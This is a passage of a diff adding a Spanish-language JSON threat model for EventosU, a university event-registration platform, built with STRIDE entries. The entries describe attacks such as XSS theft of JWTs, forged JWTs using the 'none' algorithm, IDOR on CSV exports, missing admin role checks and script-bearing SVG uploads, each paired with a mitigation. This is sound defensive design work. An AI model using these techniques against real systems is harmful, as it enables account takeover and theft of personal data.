+            "shape": "trust-boundary-box",
+            "id": "b632b42e-d0aa-57ef-8f0d-8fdf81f21166",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "LC3 Proveedores externos",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 20,
+              "y": 250
+            },
+            "size": {
+              "width": 720,
+              "height": 1010
+            },
+            "attrs": {
+              "label": {
+                "text": "LC1 Internet: usuarios y dispositivos (no confiable)"
+              }
+            },
+            "visible": true,
+            "shape": "trust-boundary-box",
+            "id": "bf928678-52bf-5b9d-917e-c1308fffe380",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "LC1 Internet: usuarios y dispositivos (no confiable)",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 840,
+              "y": 470
+            },
+            "size": {
+              "width": 330,
+              "height": 440
+            },
+            "attrs": {
+              "label": {
+                "text": "Nube EventosU: zona de aplicación"
+              }
+            },
+            "visible": true,
+            "shape": "trust-boundary-box",
+            "id": "3013fcc3-7d58-5a71-92f0-ad2eea8153da",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "Nube EventosU: zona de aplicación",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 1290,
+              "y": 340
+            },
+            "size": {
+              "width": 420,
+              "height": 860
+            },
+            "attrs": {
+              "label": {
+                "text": "LC2 Nube EventosU: zona de datos privada"
+              }
+            },
+            "visible": true,
+            "shape": "trust-boundary-box",
+            "id": "7d2c5e3c-6fb0-56a5-86bf-2540c5d642e7",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "LC2 Nube EventosU: zona de datos privada",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 40,
+              "y": 300
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Visitante"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "ac637f71-b0b7-5af9-b27e-62c9587eb0e6",
+            "data": {
+              "name": "Visitante",
+              "description": "Usuario anónimo que consulta el catálogo.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 40,
+              "y": 500
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Estudiante o público"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "b51f5276-4699-5bb4-a13a-b1317b524e60",
+            "data": {
+              "name": "Estudiante o público",
+              "description": "Usuario registrado que se inscribe y paga.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 40,
+              "y": 720
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Organizador"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "1ea75a5f-45a5-563a-82e2-ffb32cf4bd52",
+            "data": {
+              "name": "Organizador",
+              "description": "Crea eventos, sube afiches y exporta inscritos.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 40,
+              "y": 920
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Administrador"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "a626d93c-c497-540a-b56f-68735e1bf324",
+            "data": {
+              "name": "Administrador",
+              "description": "Gestiona usuarios, roles y reportes.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 40,
+              "y": 1130
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Personal de Puerta"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "95b62b98-f02a-52cc-ad76-833efc5ccf02",
+            "data": {
+              "name": "Personal de Puerta",
+              "description": "Escanea QR con la app móvil.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 410,
+              "y": 690
+            },
+            "size": {
+              "width": 150,
+              "height": 60
+            },
+            "attrs": {
+              "text": {
+                "text": "Almacenamiento\ndel navegador"
+              },
+              "topLine": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              },
+              "bottomLine": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "store",
+            "zIndex": 1,
+            "id": "0f183aab-713e-50a0-a590-1c412887769c",
+            "data": {
+              "name": "Almacenamiento\ndel navegador",
+              "description": "localStorage del navegador donde el sitio guarda el JWT.",
+              "type": "tm.Store",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "isALog": false,
+              "storesCredentials": true,
+              "isEncrypted": false,
+              "isSigned": false
+            }
+          },
+          {
+            "position": {
+              "x": 420,
+              "y": 450
+            },
+            "size": {
+              "width": 130,
+              "height": 130
+            },
+            "attrs": {
+              "text": {
+                "text": "Sitio web React\n(CDN)"
+              },
+              "body": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "process",
+            "zIndex": 1,
+            "id": "1a50b90e-12b7-541a-8f9b-f71b1609c29f",
+            "data": {
+              "name": "Sitio web React\n(CDN)",
+              "description": "SPA en React servida desde un CDN, guarda el token en el navegador.",
+              "type": "tm.Process",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "1d7595d4-c360-56f2-8d01-ace9d49eddae",
+                  "title": "T16 Robo del JWT guardado en localStorage mediante XSS",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "Un organizador malicioso o con la cuenta comprometida puede insertar un script en la descripción de un evento, si esta se renderiza como HTML, y obtiene el JWT guardado en localStorage de cada usuario que visita la página, incluidos los administradores.",
+                  "mitigation": "Respuesta: Mitigar. El JWT pasa a una cookie HttpOnly, Secure y SameSite=Strict en lugar de localStorage, el sitio no usa dangerouslySetInnerHTML y sanitiza con DOMPurify cualquier texto enriquecido, y el CDN envía una Content-Security-Policy que prohíbe scripts en línea y de dominios no autorizados.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 16,
+                  "score": "6 (I3 x P2, Alto)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "handlesCardPayment": false,
+              "handlesGoodsOrServices": false,
+              "isWebApplication": true,
+              "privilegeLevel": ""
+            }
+          },
+          {
+            "position": {
+              "x": 420,
+              "y": 880
+            },
+            "size": {
+              "width": 130,
+              "height": 130
+            },
+            "attrs": {
+              "text": {
+                "text": "Panel de\nadministración\n(/admin)"
+              },
+              "body": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "process",
+            "zIndex": 1,
+            "id": "bff32435-3f00-5a9f-ba45-4f49a1a7a3ff",
+            "data": {
+              "name": "Panel de\nadministración\n(/admin)",
+              "description": "Ruta /admin del mismo sitio, comparte login con los usuarios.",
+              "type": "tm.Process",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "bde1f99f-5ea9-5ffd-ab94-30637c51e3b0",
+                  "title": "T17 Funciones administrativas sin control de rol en el servidor",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Elevation of privilege",
+                  "description": "Un estudiante que inicia sesión normalmente puede abrir /admin o llamar de forma directa a PUT /api/usuarios/{id}/rol, y obtiene permisos de administrador si la API confía en que el frontend oculta el menú y no valida el rol en el servidor, con lo cual puede marcar pagos, cambiar roles y ver reportes.",
+                  "mitigation": "Respuesta: Mitigar. Todas las rutas /api/admin/* pasan por un middleware de autorización que niega por defecto y exige el rol administrador leído del token validado en el servidor, las cuentas administrativas requieren MFA de Entra ID y las pruebas DAST recorren cada ruta administrativa con un usuario estudiante esperando respuesta 403.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 17,
+                  "score": "9 (I3 x P3, Crítico)"
+                },
+                {
+                  "id": "d7aa0eb3-7ae6-5d2a-91c7-5b5d2c453996",
+                  "title": "T24 Cambios de rol sin rastro",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "Un administrador que asigna el rol organizador a una cuenta externa sin autorización puede negar el cambio cuando se detecta el abuso, porque no queda registro de quién modificó el rol ni de su valor anterior.",
+                  "mitigation": "Respuesta: Mitigar. Cada cambio de usuario o rol genera un registro de auditoría con actor, objetivo, valor anterior, valor nuevo, fecha e IP en el almacén de logs de solo inserción, y la asignación del rol administrador requiere la aprobación de un segundo administrador.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 24,
+                  "score": "3 (I3 x P1, Medio)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "handlesCardPayment": false,
+              "handlesGoodsOrServices": false,
+              "isWebApplication": true,
+              "privilegeLevel": ""
+            }
+          },
+          {
+            "position": {
+              "x": 420,
+              "y": 1100
+            },
+            "size": {
+              "width": 130,
+              "height": 130
+            },
+            "attrs": {
+              "text": {
+                "text": "App de Puerta\n(móvil)"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "process",
+            "zIndex": 1,
+            "id": "8b233968-770b-520b-8502-224fc2814dd1",
+            "data": {
+              "name": "App de Puerta\n(móvil)",
+              "description": "Aplicación móvil que consulta la API para validar el QR.",
+              "type": "tm.Process",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "handlesCardPayment": false,
+              "handlesGoodsOrServices": false,
+              "isWebApplication": false,
+              "privilegeLevel": ""
+            }
+          },
+          {
+            "position": {
+              "x": 930,
+              "y": 610
+            },
+            "size": {
+              "width": 150,
+              "height": 150
+            },
+            "attrs": {
+              "text": {
+                "text": "API Node.js\n(contenedor)"
+              },
+              "body": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "process",
+            "zIndex": 1,
+            "id": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865",
+            "data": {
+              "name": "API Node.js\n(contenedor)",
+              "description": "API REST con autenticación JWT, emite QR, recibe webhooks y genera CSV.",
+              "type": "tm.Process",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "8ad00176-5a6d-5f37-882d-fc9b233c0cc8",
+                  "title": "T06 Condición de carrera al marcar el QR como usado",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "Dos personas con capturas del mismo QR que se presentan al mismo tiempo en puertas distintas pueden ser aceptadas ambas, porque la API consulta si el QR está usado y luego lo actualiza en dos pasos separados, y obtienen dos ingresos con una sola entrada pagada.",
+                  "mitigation": "Respuesta: Mitigar. El consumo del QR se ejecuta como una sola sentencia atómica UPDATE ... SET usado_en = now() WHERE token = $1 AND usado_en IS NULL RETURNING id, si no se afecta ninguna fila la respuesta es “ya usado”, y una prueba de concurrencia lanza 20 validaciones simultáneas del mismo token esperando un único “válido”.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 6,
+                  "score": "6 (I2 x P3, Alto)"
+                },
+                {
+                  "id": "ddb10c63-ce5f-5646-99c7-526ed551fb5c",
+                  "title": "T09 Exportación del CSV de un evento ajeno (IDOR)",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Elevation of privilege",
+                  "description": "Un organizador del evento A que cambia el identificador en la ruta /eventos/{id}/inscritos.csv puede solicitar la lista del evento B de otro organizador, y obtiene nombre, correo, carné y teléfono de todos sus inscritos porque la API solo verifica que el usuario tenga rol organizador.",
+                  "mitigation": "Respuesta: Mitigar. La API comprueba en cada petición que el evento solicitado pertenezca al organizador autenticado mediante una función de autorización a nivel de objeto aplicada desde un middleware común, y las pruebas automatizadas intentan exportar eventos ajenos esperando respuesta 403.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 9,
+                  "score": "9 (I3 x P3, Crítico)"
+                },
+                {
+                  "id": "ce3b49f8-ba84-59f4-887c-f3fd37989386",
+                  "title": "T12 Exportaciones sin registro de autoría",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "Un organizador que exporta la lista de inscritos y la comparte con una empresa de publicidad puede negar haberlo hecho cuando se detecta la filtración, porque el sistema no registra quién exportó, cuándo ni cuántos registros, y la universidad no puede asignar responsabilidades.",
+                  "mitigation": "Respuesta: Mitigar. Cada exportación genera un evento de auditoría con usuario, evento, fecha, IP y número de filas que se envía al almacén de logs de solo inserción, y el nombre del archivo incluye el identificador del usuario que lo generó.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 12,
+                  "score": "4 (I2 x P2, Medio)"
+                },
+                {
+                  "id": "6ea45180-633b-530c-8636-b720ffa45a84",
+                  "title": "T18 JWT modificado o firmado con un secreto débil",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "Un atacante que modifica su propio JWT cambiando el claim rol a “admin” y el algoritmo a “none”, o que obtiene por fuerza bruta un secreto HS256 débil, puede firmar tokens que la API acepta, y obtiene acceso completo a la API con cualquier identidad.",
+                  "mitigation": "Respuesta: Mitigar. La API firma los tokens con ES256 usando una llave guardada en el gestor de secretos, acepta solo ese algoritmo, valida exp, iss y aud en cada petición y limita la vigencia del token a 15 minutos con renovación controlada.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 18,
+                  "score": "6 (I3 x P2, Alto)"
+                },
+                {
+                  "id": "c120a377-5772-5230-9605-475de163649b",
+                  "title": "T21 Cupos acaparados con inscripciones automatizadas",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Denial of service",
+                  "description": "Un atacante con un script que crea cuentas y reserva cupos puede ocupar todas las plazas de un concierto con inscripciones pendientes de pago, y obtiene que el evento aparezca agotado para los estudiantes reales.",
+                  "mitigation": "Respuesta: Mitigar. Las inscripciones pendientes expiran a los 15 minutos si no llega el webhook de pago, cada usuario tiene como máximo una inscripción pendiente por evento, el registro exige correo verificado y el WAF limita las peticiones de inscripción por IP con CAPTCHA en picos de tráfico.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 21,
+                  "score": "6 (I2 x P3, Alto)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "handlesCardPayment": false,
+              "handlesGoodsOrServices": true,
+              "isWebApplication": false,
+              "privilegeLevel": ""
+            }
+          },
+          {
+            "position": {
+              "x": 1420,
+              "y": 400
+            },
+            "size": {
+              "width": 180,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "PostgreSQL\nadministrado"
+              },
+              "topLine": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              },
+              "bottomLine": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "store",
+            "zIndex": 1,
+            "id": "837e20c5-f8c6-512c-9a1d-ede8981ed704",
+            "data": {
+              "name": "PostgreSQL\nadministrado",
+              "description": "Usuarios, eventos, inscripciones y pagos (sin datos de tarjeta).",
+              "type": "tm.Store",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "isALog": false,
+              "storesCredentials": true,
+              "isEncrypted": true,
+              "isSigned": false
+            }
+          },
+          {
+            "position": {
+              "x": 1420,
+              "y": 660
+            },
+            "size": {
+              "width": 180,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Bucket de objetos\n(afiches y CSV)"
+              },
+              "topLine": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              },
+              "bottomLine": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "store",
+            "zIndex": 1,
+            "id": "7caf8551-4564-5e5a-93c4-930cef2e7689",
+            "data": {
+              "name": "Bucket de objetos\n(afiches y CSV)",
+              "description": "Afiches de eventos y CSV exportados.",
+              "type": "tm.Store",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "13a4e787-eddf-5ec9-8b31-8b666e7044aa",
+                  "title": "T10 CSV de inscritos accesible sin autenticación",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "Un tercero que recibe un enlace de CSV reenviado por correo o adivina su nombre, si el bucket permite lectura pública o el archivo se nombra con el identificador del evento, puede descargar la lista completa de inscritos, y obtiene datos personales de cientos de estudiantes.",
+                  "mitigation": "Respuesta: Mitigar. La configuración de infraestructura como código bloquea el acceso público al bucket y Checkov lo verifica en el pipeline, los CSV se descargan solo con URL firmada de 5 minutos emitida después de validar al organizador, se borran a las 24 horas por regla de ciclo de vida y se cifran en reposo con llave administrada.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 10,
+                  "score": "6 (I3 x P2, Alto)"
+                },
+                {
+                  "id": "7e460a8f-fb2e-5656-bcdc-3b9384c89d6d",
+                  "title": "T22 Afiche con contenido activo",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Tampering",
+                  "description": "Un organizador con la cuenta comprometida puede subir como afiche un archivo SVG o HTML con JavaScript que se sirve desde el dominio de EventosU con su content-type original, y obtiene ejecución de scripts en el navegador de quien abre el afiche.",
+                  "mitigation": "Respuesta: Mitigar. La API acepta solo JPEG y PNG validados por su firma de bytes, reprocesa la imagen para eliminar metadatos, guarda el archivo con nombre aleatorio y sirve los afiches desde un dominio separado con Content-Type y Content-Disposition fijados por la API.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 22,
+                  "score": "4 (I2 x P2, Medio)"
+                },
+                {
+                  "id": "96535470-cb36-5698-a515-7b595020c8ef",
+                  "title": "T28 Subida masiva de archivos grandes",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Denial of service",
+                  "description": "Un organizador con la cuenta comprometida puede subir de forma repetida archivos de varios gigabytes, y obtiene un aumento de los costos de almacenamiento y de transferencia del CDN que afecta el presupuesto del sitio.",
+                  "mitigation": "Respuesta: Mitigar. La API limita los afiches a 5 MB y a un archivo vigente por evento, rechaza la subida antes de escribir en el bucket si excede ese tamaño, y el bucket tiene cuota y alerta de costos.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 28,
+                  "score": "2 (I1 x P2, Bajo)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "isALog": false,
+              "storesCredentials": false,
+              "isEncrypted": true,
+              "isSigned": false
+            }
+          },
+          {
+            "position": {
+              "x": 1420,
+              "y": 1000
+            },
+            "size": {
+              "width": 180,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Almacén de logs\n(supuesto)"
+              },
+              "topLine": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              },
+              "bottomLine": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "store",
+            "zIndex": 1,
+            "id": "512803c3-bcea-5df8-9aac-16e5e715ea32",
+            "data": {
+              "name": "Almacén de logs\n(supuesto)",
+              "description": "Servicio de logs administrado, solo inserción, retención de 1 año.",
+              "type": "tm.Store",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "a17e6cdb-c22d-5cdd-bd46-7f7a7645882b",
+                  "title": "T23 Tokens y datos personales en los logs",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "Un integrante de soporte o un proveedor con acceso de lectura al servicio de logs puede leer cabeceras Authorization, cuerpos de login y respuestas con datos de inscritos si la API registra las peticiones completas, y obtiene tokens vigentes y datos personales.",
+                  "mitigation": "Respuesta: Mitigar. El middleware de logging usa una lista de campos permitidos, redacta Authorization, cookies, contraseñas, tokens y teléfono, y el acceso al almacén de logs se limita por rol con revisión trimestral de permisos.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 23,
+                  "score": "4 (I2 x P2, Medio)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "isALog": true,
+              "storesCredentials": false,
+              "isEncrypted": false,
+              "isSigned": false
+            }
+          },
+          {
+            "position": {
+              "x": 380,
+              "y": 70
+            },
+            "size": {
+              "width": 170,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Microsoft Entra ID"
+              },
+              "body": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "c217e0f7-0b97-5815-8e56-c81dae264d8d",
+            "data": {
+              "name": "Microsoft Entra ID",
+              "description": "Proveedor de identidad institucional.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "ea6a2ef6-7cae-5f03-b23d-f8d119126eb6",
+                  "title": "T27 Interrupción de Entra ID durante inscripciones",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Denial of service",
+                  "description": "Una interrupción del servicio de Microsoft Entra ID durante la apertura de inscripciones impide que los usuarios institucionales inicien sesión, y durante ese tiempo no pueden inscribirse en eventos con cupo limitado.",
+                  "mitigation": "Respuesta: Aceptar. Se acepta el riesgo porque la disponibilidad de Entra ID está cubierta por el acuerdo de servicio de Microsoft con la universidad, el login con correo y contraseña sigue disponible y la apertura de inscripciones puede reprogramarse, decisión que se revisa una vez al año. Responsable: jefe del Departamento de Tecnología de la universidad.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 27,
+                  "score": "2 (I2 x P1, Bajo)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "providesAuthentication": true
+            }
+          },
+          {
+            "position": {
+              "x": 1000,
+              "y": 70
+            },
+            "size": {
+              "width": 170,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Pasarela de pagos"
+              },
+              "body": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "7ba88cd4-43a1-5b27-b2f2-2f0431382951",
+            "data": {
+              "name": "Pasarela de pagos",
+              "description": "Proveedor externo de pagos con formulario alojado.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [
+                {
+                  "id": "948dc59d-2a15-5ef9-a3a5-881d1fd83104",
+                  "title": "T26 Captura de datos de tarjeta",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "Un atacante que compromete el sitio o el CDN podría capturar los números de tarjeta si el formulario de pago estuviera dentro de EventosU, y obtendría los datos de tarjeta de todos los compradores.",
+                  "mitigation": "Respuesta: Transferir. El pago se completa en la página alojada por la pasarela, EventosU nunca recibe ni almacena datos de tarjeta y la protección de esos datos se transfiere al proveedor certificado PCI DSS mediante un contrato que fija su responsabilidad ante incidentes y la entrega anual de su certificado de cumplimiento.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 26,
+                  "score": "3 (I3 x P1, Medio)"
+                }
+              ],
+              "hasOpenThreats": true,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 1480,
+              "y": 70
+            },
+            "size": {
+              "width": 170,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Servicio de correo"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "897220cd-d140-5215-94e7-60a8fffe6a79",
+            "data": {
+              "name": "Servicio de correo",
+              "description": "Proveedor externo de envío de correo.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Consulta de catálogo\n(HTTPS, HTML/JS)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Consulta de catálogo\n(HTTPS, HTML/JS)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "c7eaecf6-bbf1-575e-bf2c-49b68efb00f0",
+            "source": {
+              "cell": "ac637f71-b0b7-5af9-b27e-62c9587eb0e6"
+            },
+            "target": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Credenciales e inscripción\n(HTTPS, formulario)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Credenciales e inscripción\n(HTTPS, formulario)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "761170ed-8a87-5492-95a9-205c10812490",
+            "source": {
+              "cell": "b51f5276-4699-5bb4-a13a-b1317b524e60"
+            },
+            "target": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
